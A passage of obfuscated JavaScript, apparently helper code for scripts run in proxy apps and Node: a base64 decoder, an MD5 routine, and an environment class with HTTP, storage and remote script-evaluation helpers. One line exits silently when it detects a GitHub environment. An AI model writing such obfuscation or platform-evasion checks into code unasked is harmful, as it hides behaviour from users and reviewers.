      _0x465732 = this["_keyStr"]["indexOf"](_0x46d0ef["charAt"](_0x3b4383++));
      _0x50949d = this["_keyStr"]["indexOf"](_0x46d0ef["charAt"](_0x3b4383++));
      _0xaf658a = _0x112afe << 2 | _0x317e49 >> 4;
      _0x5bd0a8 = (_0x317e49 & 15) << 4 | _0x465732 >> 2;
      _0x5a3326 = (_0x465732 & 3) << 6 | _0x50949d;
      _0x2abf2d = _0x2abf2d + String["fromCharCode"](_0xaf658a);
      _0x465732 != 64 && (_0x2abf2d = _0x2abf2d + String["fromCharCode"](_0x5bd0a8));
      _0x50949d != 64 && (_0x2abf2d = _0x2abf2d + String["fromCharCode"](_0x5a3326));
    }

    _0x2abf2d = _0x331719["_utf8_decode"](_0x2abf2d);
    return _0x2abf2d;
  },
  '_utf8_encode': function (_0x13de2d) {
    _0x13de2d = _0x13de2d["replace"](/rn/g, 'n');
    var _0x4b6922 = '';

    for (var _0x1b43d9 = 0; _0x1b43d9 < _0x13de2d["length"]; _0x1b43d9++) {
      var _0x439dca = _0x13de2d["charCodeAt"](_0x1b43d9);

      if (_0x439dca < 128) {
        _0x4b6922 += String["fromCharCode"](_0x439dca);
      } else {
        _0x439dca > 127 && _0x439dca < 2048 ? (_0x4b6922 += String["fromCharCode"](_0x439dca >> 6 | 192), _0x4b6922 += String["fromCharCode"](_0x439dca & 63 | 128)) : (_0x4b6922 += String["fromCharCode"](_0x439dca >> 12 | 224), _0x4b6922 += String["fromCharCode"](_0x439dca >> 6 & 63 | 128), _0x4b6922 += String["fromCharCode"](_0x439dca & 63 | 128));
      }
    }

    return _0x4b6922;
  },
  '_utf8_decode': function (_0x42c30e) {
    var _0x5849bf = '',
        _0x5a3020 = 0,
        _0x41cb37 = c1 = c2 = 0;

    while (_0x5a3020 < _0x42c30e["length"]) {
      _0x41cb37 = _0x42c30e["charCodeAt"](_0x5a3020);

      if (_0x41cb37 < 128) {
        _0x5849bf += String["fromCharCode"](_0x41cb37), _0x5a3020++;
      } else {
        _0x41cb37 > 191 && _0x41cb37 < 224 ? (c2 = _0x42c30e["charCodeAt"](_0x5a3020 + 1), _0x5849bf += String["fromCharCode"]((_0x41cb37 & 31) << 6 | c2 & 63), _0x5a3020 += 2) : (c2 = _0x42c30e["charCodeAt"](_0x5a3020 + 1), c3 = _0x42c30e["charCodeAt"](_0x5a3020 + 2), _0x5849bf += String["fromCharCode"]((_0x41cb37 & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x5a3020 += 3);
      }
    }

    return _0x5849bf;
  }
};

function _0xcb54a4(_0x32c89f) {
  function _0x3ccfe3(_0x1496c7, _0x2182e5) {
    return _0x1496c7 << _0x2182e5 | _0x1496c7 >>> 32 - _0x2182e5;
  }

  function _0x177566(_0xb66b66, _0x2b39bd) {
    var _0x497df2, _0x8dfb10, _0x199caa, _0x7e7ef, _0x4eae60;

    _0x199caa = 2147483648 & _0xb66b66;
    _0x7e7ef = 2147483648 & _0x2b39bd;
    _0x497df2 = 1073741824 & _0xb66b66;
    _0x8dfb10 = 1073741824 & _0x2b39bd;
    _0x4eae60 = (1073741823 & _0xb66b66) + (1073741823 & _0x2b39bd);
    return _0x497df2 & _0x8dfb10 ? 2147483648 ^ _0x4eae60 ^ _0x199caa ^ _0x7e7ef : _0x497df2 | _0x8dfb10 ? 1073741824 & _0x4eae60 ? 3221225472 ^ _0x4eae60 ^ _0x199caa ^ _0x7e7ef : 1073741824 ^ _0x4eae60 ^ _0x199caa ^ _0x7e7ef : _0x4eae60 ^ _0x199caa ^ _0x7e7ef;
  }

  function _0x23d573(_0x1e0c3f, _0x317ccf, _0x248ae6) {
    return _0x1e0c3f & _0x317ccf | ~_0x1e0c3f & _0x248ae6;
  }

  function _0x23ce21(_0x4e4056, _0x48f869, _0x2e57a3) {
    return _0x4e4056 & _0x2e57a3 | _0x48f869 & ~_0x2e57a3;
  }

  function _0x1c0895(_0x226c77, _0x21fdad, _0xc67c6d) {
    return _0x226c77 ^ _0x21fdad ^ _0xc67c6d;
  }

  function _0x4f34b5(_0x5751d7, _0xc0804f, _0x349601) {
    return _0xc0804f ^ (_0x5751d7 | ~_0x349601);
  }

  function _0x272e58(_0x19f37f, _0x4df393, _0xf22e97, _0xd095c4, _0x42c43c, _0x57f59e, _0x1258bf) {
    _0x19f37f = _0x177566(_0x19f37f, _0x177566(_0x177566(_0x23d573(_0x4df393, _0xf22e97, _0xd095c4), _0x42c43c), _0x1258bf));
    return _0x177566(_0x3ccfe3(_0x19f37f, _0x57f59e), _0x4df393);
  }

  function _0x1c6859(_0x2c152e, _0x265f77, _0x5b1ceb, _0x4ce2ed, _0x25a933, _0x56735e, _0x4e5b3b) {
    _0x2c152e = _0x177566(_0x2c152e, _0x177566(_0x177566(_0x23ce21(_0x265f77, _0x5b1ceb, _0x4ce2ed), _0x25a933), _0x4e5b3b));
    return _0x177566(_0x3ccfe3(_0x2c152e, _0x56735e), _0x265f77);
  }

  function _0x1b9794(_0x7a4bd4, _0x582dcd, _0x2d3e34, _0x1b1aba, _0xb61df6, _0x5d1ead, _0x21b1d0) {
    _0x7a4bd4 = _0x177566(_0x7a4bd4, _0x177566(_0x177566(_0x1c0895(_0x582dcd, _0x2d3e34, _0x1b1aba), _0xb61df6), _0x21b1d0));
    return _0x177566(_0x3ccfe3(_0x7a4bd4, _0x5d1ead), _0x582dcd);
  }

  function _0x5641d3(_0x3b678a, _0xee63a5, _0xf92966, _0x1e8c75, _0x471cf6, _0x5d61bc, _0x3f6b9a) {
    _0x3b678a = _0x177566(_0x3b678a, _0x177566(_0x177566(_0x4f34b5(_0xee63a5, _0xf92966, _0x1e8c75), _0x471cf6), _0x3f6b9a));
    return _0x177566(_0x3ccfe3(_0x3b678a, _0x5d61bc), _0xee63a5);
  }

  function _0x5bb69f(_0x5ded76) {
    for (var _0x26b670, _0x144855 = _0x5ded76["length"], _0x259898 = _0x144855 + 8, _0x5daec3 = (_0x259898 - _0x259898 % 64) / 64, _0x5d033a = 16 * (_0x5daec3 + 1), _0x5e6707 = new Array(_0x5d033a - 1), _0xf3cb10 = 0, _0x49f731 = 0; _0x144855 > _0x49f731;) {
      _0x26b670 = (_0x49f731 - _0x49f731 % 4) / 4, _0xf3cb10 = _0x49f731 % 4 * 8, _0x5e6707[_0x26b670] = _0x5e6707[_0x26b670] | _0x5ded76["charCodeAt"](_0x49f731) << _0xf3cb10, _0x49f731++;
    }

    _0x26b670 = (_0x49f731 - _0x49f731 % 4) / 4;
    _0xf3cb10 = _0x49f731 % 4 * 8;
    _0x5e6707[_0x26b670] = _0x5e6707[_0x26b670] | 128 << _0xf3cb10;
    _0x5e6707[_0x5d033a - 2] = _0x144855 << 3;
    _0x5e6707[_0x5d033a - 1] = _0x144855 >>> 29;
    return _0x5e6707;
  }

  function _0x455975(_0x34f4fd) {
    var _0x57d327,
        _0x596ef8,
        _0x322e6b = '',
        _0x3a7570 = '';

    for (_0x596ef8 = 0; 3 >= _0x596ef8; _0x596ef8++) {
      _0x57d327 = _0x34f4fd >>> 8 * _0x596ef8 & 255;
      _0x3a7570 = '0' + _0x57d327["toString"](16);
      _0x322e6b += _0x3a7570["substr"](_0x3a7570["length"] - 2, 2);
    }

    return _0x322e6b;
  }

  function _0x5ec5b4(_0x4cbc95) {
    _0x4cbc95 = _0x4cbc95["replace"](/\r\n/g, "\n");

    for (var _0x19b301 = '', _0x3a786d = 0; _0x3a786d < _0x4cbc95["length"]; _0x3a786d++) {
      var _0x3f295c = _0x4cbc95["charCodeAt"](_0x3a786d);

      128 > _0x3f295c ? _0x19b301 += String["fromCharCode"](_0x3f295c) : _0x3f295c > 127 && 2048 > _0x3f295c ? (_0x19b301 += String["fromCharCode"](_0x3f295c >> 6 | 192), _0x19b301 += String["fromCharCode"](63 & _0x3f295c | 128)) : (_0x19b301 += String["fromCharCode"](_0x3f295c >> 12 | 224), _0x19b301 += String["fromCharCode"](_0x3f295c >> 6 & 63 | 128), _0x19b301 += String["fromCharCode"](63 & _0x3f295c | 128));
    }

    return _0x19b301;
  }

  var _0x3cc22f,
      _0x5e1471,
      _0x1f76d9,
      _0x11067f,
      _0x34543f,
      _0x2b51b8,
      _0x1ee2f9,
      _0x570d7d,
      _0x2bc7e7,
      _0x15eede = [],
      _0x418002 = 7,
      _0x41c55a = 12,
      _0x5a8f3c = 17,
      _0xd134ff = 22,
      _0x2978a2 = 5,
      _0x16058c = 9,
      _0x3d2bc0 = 14,
      _0xd24bdc = 20,
      _0x30331a = 4,
      _0x236fa0 = 11,
      _0x40d552 = 16,
      _0x2ab77c = 23,
      _0x56d96e = 6,
      _0x10a256 = 10,
      _0xc75d05 = 15,
      _0x4bcb3e = 21;

  for (_0x32c89f = _0x5ec5b4(_0x32c89f), _0x15eede = _0x5bb69f(_0x32c89f), _0x2b51b8 = 1732584193, _0x1ee2f9 = 4023233417, _0x570d7d = 2562383102, _0x2bc7e7 = 271733878, _0x3cc22f = 0; _0x3cc22f < _0x15eede["length"]; _0x3cc22f += 16) {
    _0x5e1471 = _0x2b51b8;
    _0x1f76d9 = _0x1ee2f9;
    _0x11067f = _0x570d7d;
    _0x34543f = _0x2bc7e7;
    _0x2b51b8 = _0x272e58(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 0], _0x418002, 3614090360);
    _0x2bc7e7 = _0x272e58(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 1], _0x41c55a, 3905402710);
    _0x570d7d = _0x272e58(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 2], _0x5a8f3c, 606105819);
    _0x1ee2f9 = _0x272e58(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 3], _0xd134ff, 3250441966);
    _0x2b51b8 = _0x272e58(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 4], _0x418002, 4118548399);
    _0x2bc7e7 = _0x272e58(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 5], _0x41c55a, 1200080426);
    _0x570d7d = _0x272e58(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 6], _0x5a8f3c, 2821735955);
    _0x1ee2f9 = _0x272e58(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 7], _0xd134ff, 4249261313);
    _0x2b51b8 = _0x272e58(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 8], _0x418002, 1770035416);
    _0x2bc7e7 = _0x272e58(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 9], _0x41c55a, 2336552879);
    _0x570d7d = _0x272e58(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 10], _0x5a8f3c, 4294925233);
    _0x1ee2f9 = _0x272e58(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 11], _0xd134ff, 2304563134);
    _0x2b51b8 = _0x272e58(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 12], _0x418002, 1804603682);
    _0x2bc7e7 = _0x272e58(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 13], _0x41c55a, 4254626195);
    _0x570d7d = _0x272e58(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 14], _0x5a8f3c, 2792965006);
    _0x1ee2f9 = _0x272e58(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 15], _0xd134ff, 1236535329);
    _0x2b51b8 = _0x1c6859(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 1], _0x2978a2, 4129170786);
    _0x2bc7e7 = _0x1c6859(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 6], _0x16058c, 3225465664);
    _0x570d7d = _0x1c6859(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 11], _0x3d2bc0, 643717713);
    _0x1ee2f9 = _0x1c6859(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 0], _0xd24bdc, 3921069994);
    _0x2b51b8 = _0x1c6859(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 5], _0x2978a2, 3593408605);
    _0x2bc7e7 = _0x1c6859(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 10], _0x16058c, 38016083);
    _0x570d7d = _0x1c6859(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 15], _0x3d2bc0, 3634488961);
    _0x1ee2f9 = _0x1c6859(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 4], _0xd24bdc, 3889429448);
    _0x2b51b8 = _0x1c6859(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 9], _0x2978a2, 568446438);
    _0x2bc7e7 = _0x1c6859(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 14], _0x16058c, 3275163606);
    _0x570d7d = _0x1c6859(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 3], _0x3d2bc0, 4107603335);
    _0x1ee2f9 = _0x1c6859(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 8], _0xd24bdc, 1163531501);
    _0x2b51b8 = _0x1c6859(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 13], _0x2978a2, 2850285829);
    _0x2bc7e7 = _0x1c6859(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 2], _0x16058c, 4243563512);
    _0x570d7d = _0x1c6859(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 7], _0x3d2bc0, 1735328473);
    _0x1ee2f9 = _0x1c6859(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 12], _0xd24bdc, 2368359562);
    _0x2b51b8 = _0x1b9794(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 5], _0x30331a, 4294588738);
    _0x2bc7e7 = _0x1b9794(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 8], _0x236fa0, 2272392833);
    _0x570d7d = _0x1b9794(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 11], _0x40d552, 1839030562);
    _0x1ee2f9 = _0x1b9794(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 14], _0x2ab77c, 4259657740);
    _0x2b51b8 = _0x1b9794(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 1], _0x30331a, 2763975236);
    _0x2bc7e7 = _0x1b9794(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 4], _0x236fa0, 1272893353);
    _0x570d7d = _0x1b9794(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 7], _0x40d552, 4139469664);
    _0x1ee2f9 = _0x1b9794(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 10], _0x2ab77c, 3200236656);
    _0x2b51b8 = _0x1b9794(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 13], _0x30331a, 681279174);
    _0x2bc7e7 = _0x1b9794(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 0], _0x236fa0, 3936430074);
    _0x570d7d = _0x1b9794(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 3], _0x40d552, 3572445317);
    _0x1ee2f9 = _0x1b9794(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 6], _0x2ab77c, 76029189);
    _0x2b51b8 = _0x1b9794(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 9], _0x30331a, 3654602809);
    _0x2bc7e7 = _0x1b9794(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 12], _0x236fa0, 3873151461);
    _0x570d7d = _0x1b9794(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 15], _0x40d552, 530742520);
    _0x1ee2f9 = _0x1b9794(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 2], _0x2ab77c, 3299628645);
    _0x2b51b8 = _0x5641d3(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 0], _0x56d96e, 4096336452);
    _0x2bc7e7 = _0x5641d3(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 7], _0x10a256, 1126891415);
    _0x570d7d = _0x5641d3(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 14], _0xc75d05, 2878612391);
    _0x1ee2f9 = _0x5641d3(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 5], _0x4bcb3e, 4237533241);
    _0x2b51b8 = _0x5641d3(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 12], _0x56d96e, 1700485571);
    _0x2bc7e7 = _0x5641d3(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 3], _0x10a256, 2399980690);
    _0x570d7d = _0x5641d3(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 10], _0xc75d05, 4293915773);
    _0x1ee2f9 = _0x5641d3(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 1], _0x4bcb3e, 2240044497);
    _0x2b51b8 = _0x5641d3(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 8], _0x56d96e, 1873313359);
    _0x2bc7e7 = _0x5641d3(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 15], _0x10a256, 4264355552);
    _0x570d7d = _0x5641d3(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 6], _0xc75d05, 2734768916);
    _0x1ee2f9 = _0x5641d3(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 13], _0x4bcb3e, 1309151649);
    _0x2b51b8 = _0x5641d3(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 4], _0x56d96e, 4149444226);
    _0x2bc7e7 = _0x5641d3(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 11], _0x10a256, 3174756917);
    _0x570d7d = _0x5641d3(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 2], _0xc75d05, 718787259);
    _0x1ee2f9 = _0x5641d3(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 9], _0x4bcb3e, 3951481745);
    _0x2b51b8 = _0x177566(_0x2b51b8, _0x5e1471);
    _0x1ee2f9 = _0x177566(_0x1ee2f9, _0x1f76d9);
    _0x570d7d = _0x177566(_0x570d7d, _0x11067f);
    _0x2bc7e7 = _0x177566(_0x2bc7e7, _0x34543f);
  }

  var _0x3acd0c = _0x455975(_0x2b51b8) + _0x455975(_0x1ee2f9) + _0x455975(_0x570d7d) + _0x455975(_0x2bc7e7);

  return _0x3acd0c["toLowerCase"]();
}

function _0x4f15e2(_0x1175a5, _0x4f6465) {
  "undefined" != typeof process && JSON["stringify"](process["env"])["indexOf"]("GITHUB") > -1 && process["exit"](0);

  class _0x4bbd2d {
    constructor(_0x3aaff9) {
      this["env"] = _0x3aaff9;
    }

    ["send"](_0x4216c9, _0x586804 = "GET") {
      _0x4216c9 = "string" == typeof _0x4216c9 ? {
        'url': _0x4216c9
      } : _0x4216c9;
      let _0x2915c2 = this["get"];
      "POST" === _0x586804 && (_0x2915c2 = this["post"]);
      "PUT" === _0x586804 && (_0x2915c2 = this["put"]);
      return new Promise((_0x19a261, _0x549652) => {
        _0x2915c2["call"](this, _0x4216c9, (_0x14bd6c, _0x4e1c9e, _0x261dfb) => {
          _0x14bd6c ? _0x549652(_0x14bd6c) : _0x19a261(_0x4e1c9e);
        });
      });
    }

    ["get"](_0x2ad7b1) {
      return this["send"]["call"](this["env"], _0x2ad7b1);
    }

    ["post"](_0x47329b) {
      return this["send"]["call"](this["env"], _0x47329b, "POST");
    }

    ["put"](_0x4922e6) {
      return this["send"]["call"](this["env"], _0x4922e6, "PUT");
    }

  }

  return new class {
    constructor(_0x55a62c, _0x2360e3) {
      this["name"] = _0x55a62c;
      this["http"] = new _0x4bbd2d(this);
      this["data"] = null;
      this["dataFile"] = "box.dat";
      this["logs"] = [];
      this["isMute"] = false;
      this["isNeedRewrite"] = false;
      this["logSeparator"] = "\n";
      this["startTime"] = new Date()["getTime"]();
      Object["assign"](this, _0x2360e3);
      this["log"]('', '🔔' + this["name"] + ", 开始!");
    }

    ["isNode"]() {
      return "undefined" != typeof module && !!module["exports"];
    }

    ["isQuanX"]() {
      return "undefined" != typeof $task;
    }

    ["isSurge"]() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }

    ["isLoon"]() {
      return "undefined" != typeof $loon;
    }

    ["toObj"](_0x3fb763, _0x1ff463 = null) {
      try {
        return JSON["parse"](_0x3fb763);
      } catch {
        return _0x1ff463;
      }
    }

    ["toStr"](_0x278839, _0x31c5ac = null) {
      try {
        return JSON["stringify"](_0x278839);
      } catch {
        return _0x31c5ac;
      }
    }

    ["getjson"](_0x3e4ac5, _0x5c6137) {
      let _0x19e2ae = _0x5c6137;

      const _0x1b00de = this["getdata"](_0x3e4ac5);

      if (_0x1b00de) {
        try {
          _0x19e2ae = JSON["parse"](this["getdata"](_0x3e4ac5));
        } catch {}
      }

      return _0x19e2ae;
    }

    ["setjson"](_0xf54cda, _0xc2cdd8) {
      try {
        return this["setdata"](JSON["stringify"](_0xf54cda), _0xc2cdd8);
      } catch {
        return false;
      }
    }

    ["getScript"](_0x2ee477) {
      return new Promise(_0x18fbbf => {
        const _0x377c9d = {
          "url": _0x2ee477
        };
        this["get"](_0x377c9d, (_0x37b7f7, _0x3360b6, _0x630f0a) => _0x18fbbf(_0x630f0a));
      });
    }

    ["runScript"](_0x45bb97, _0x36583a) {
      return new Promise(_0x5434a3 => {
        let _0x2f35a0 = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");

        _0x2f35a0 = _0x2f35a0 ? _0x2f35a0["replace"](/\n/g, '')["trim"]() : _0x2f35a0;

        let _0x3dd96c = this["getdata"]("@chavy_boxjs_userCfgs.httpapi_timeout");

        _0x3dd96c = _0x3dd96c ? 1 * _0x3dd96c : 20;
        _0x3dd96c = _0x36583a && _0x36583a["timeout"] ? _0x36583a["timeout"] : _0x3dd96c;
        const _0x4873a5 = {
          "script_text": _0x45bb97,
          "mock_type": "cron",
          "timeout": _0x3dd96c
        };

        const [_0x5e992e, _0x1def12] = _0x2f35a0["split"]('@'),
              _0x86577f = {
          'url': "http://" + _0x1def12 + "/v1/scripting/evaluate",
          'body': _0x4873a5,
          'headers': {
            'X-Key': _0x5e992e,
            'Accept': "*/*"
          }
        };

        this["post"](_0x86577f, (_0x332a18, _0x34ca3f, _0x170939) => _0x5434a3(_0x170939));
      })["catch"](_0x236835 => this["logErr"](_0x236835));
    }

    ["loaddata"]() {
      if (!this["isNode"]()) {
        return {};
      }

      {
        this['fs'] = this['fs'] ? this['fs'] : require('fs');
        this["path"] = this["path"] ? this["path"] : require("path");

        const _0x4bc6da = this["path"]["resolve"](this["dataFile"]),
              _0x3c845a = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              _0x290c47 = this['fs']["existsSync"](_0x4bc6da),
              _0x48e494 = !_0x290c47 && this['fs']["existsSync"](_0x3c845a);

        if (!_0x290c47 && !_0x48e494) {
          return {};
        }

        {
          const _0x1f93f3 = _0x290c47 ? _0x4bc6da : _0x3c845a;

          try {
            return JSON["parse"](this['fs']["readFileSync"](_0x1f93f3));
          } catch (_0x40d25e) {
            return {};
          }
        }
      }
    }

    ["writedata"]() {
      if (this["isNode"]()) {
        this['fs'] = this['fs'] ? this['fs'] : require('fs');
        this["path"] = this["path"] ? this["path"] : require("path");

        const _0x479dbc = this["path"]["resolve"](this["dataFile"]),
              _0x55a7ee = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              _0x3a4b0d = this['fs']["existsSync"](_0x479dbc),
              _0x3be0c4 = !_0x3a4b0d && this['fs']["existsSync"](_0x55a7ee),
              _0x679d3d = JSON["stringify"](this["data"]);

        _0x3a4b0d ? this['fs']["writeFileSync"](_0x479dbc, _0x679d3d) : _0x3be0c4 ? this['fs']["writeFileSync"](_0x55a7ee, _0x679d3d) : this['fs']["writeFileSync"](_0x479dbc, _0x679d3d);
      }
    }

    ["lodash_get"](_0x183377, _0x2cf2ed, _0x40746e) {
      const _0x5547cc = _0x2cf2ed["replace"](/\[(\d+)\]/g, ".$1")["split"]('.');

      let _0x5cae02 = _0x183377;

      for (const _0x5bc7c0 of _0x5547cc) if (_0x5cae02 = Object(_0x5cae02)[_0x5bc7c0], void 0 === _0x5cae02) {
        return _0x40746e;
      }

      return _0x5cae02;
    }

    ["lodash_set"](_0x1f98b7, _0x11b859, _0x1030ad) {
      return Object(_0x1f98b7) !== _0x1f98b7 ? _0x1f98b7 : (Array["isArray"](_0x11b859) || (_0x11b859 = _0x11b859["toString"]()["match"](/[^.[\]]+/g) || []), _0x11b859["slice"](0, -1)["reduce"]((_0x1abfef, _0x1b0a6c, _0x34ae0c) => Object(_0x1abfef[_0x1b0a6c]) === _0x1abfef[_0x1b0a6c] ? _0x1abfef[_0x1b0a6c] : _0x1abfef[_0x1b0a6c] = Math["abs"](_0x11b859[_0x34ae0c + 1]) >> 0 == +_0x11b859[_0x34ae0c + 1] ? [] : {}, _0x1f98b7)[_0x11b859[_0x11b859["length"] - 1]] = _0x1030ad, _0x1f98b7);
    }

    ["getdata"](_0x27337a) {
      let _0x5e5c92 = this["getval"](_0x27337a);

      if (/^@/["test"](_0x27337a)) {
        const [, _0x38d6c0, _0x33c37e] = /^@(.*?)\.(.*?)$/["exec"](_0x27337a),
              _0x369c96 = _0x38d6c0 ? this["getval"](_0x38d6c0) : '';

        if (_0x369c96) {
          try {
            const _0x59bbe8 = JSON["parse"](_0x369c96);

            _0x5e5c92 = _0x59bbe8 ? this["lodash_get"](_0x59bbe8, _0x33c37e, '') : _0x5e5c92;
          } catch (_0x4b00c8) {
            _0x5e5c92 = '';
          }
        }
      }

      return _0x5e5c92;
    }

    ["setdata"](_0x29ad27, _0x1a983e) {
      let _0x20095b = false;

      if (/^@/["test"](_0x1a983e)) {
        const [, _0x319e8e, _0x1152cd] = /^@(.*?)\.(.*?)$/["exec"](_0x1a983e),
              _0x5ccbaf = this["getval"](_0x319e8e),
              _0x1979a7 = _0x319e8e ? "null" === _0x5ccbaf ? null : _0x5ccbaf || '{}' : '{}';

        try {
          const _0x18f2a5 = JSON["parse"](_0x1979a7);

          this["lodash_set"](_0x18f2a5, _0x1152cd, _0x29ad27);
          _0x20095b = this["setval"](JSON["stringify"](_0x18f2a5), _0x319e8e);
        } catch (_0x2cfa4b) {
          const _0x1dd601 = {};
          this["lodash_set"](_0x1dd601, _0x1152cd, _0x29ad27);
          _0x20095b = this["setval"](JSON["stringify"](_0x1dd601), _0x319e8e);
        }
      } else {
        _0x20095b = this["setval"](_0x29ad27, _0x1a983e);
      }

      return _0x20095b;
    }

    ["getval"](_0x24c095) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["read"](_0x24c095) : this["isQuanX"]() ? $prefs["valueForKey"](_0x24c095) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][_0x24c095]) : this["data"] && this["data"][_0x24c095] || null;
    }

    ["setval"](_0x21cd79, _0x13bba3) {
